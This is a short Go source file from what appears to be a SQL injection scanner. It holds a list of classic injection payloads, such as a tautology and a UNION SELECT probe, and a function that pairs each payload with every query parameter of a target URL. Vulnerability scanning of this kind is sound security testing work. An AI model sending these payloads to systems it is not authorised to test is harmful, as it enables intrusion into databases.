package scanner

import "net/url"

var Payloads = []string{
	"'",
	"1'",
	"1\"",
	"1' OR '1'='1' --",
	"1' UNION SELECT NULL --",
}

func BuildTasks(target string, payloads []string) ([]Task, error) {
	var tasks []Task

	if payloads == nil {
		payloads = Payloads
	}

	u, err := url.Parse(target)
	if err != nil {
		return nil, err
	}

	for name, values := range u.Query() {
		for _, v := range values {
			for _, p := range payloads {
				task := Task{
					target:     cloneUrl(u),
					paramName:  name,
					paramValue: v,
					payload:    p,
				}
				tasks = append(tasks, task)
			}
		}
	}

	return tasks, nil
}

func cloneUrl(u *url.URL) *url.URL {
	c := *u
	return &c
}
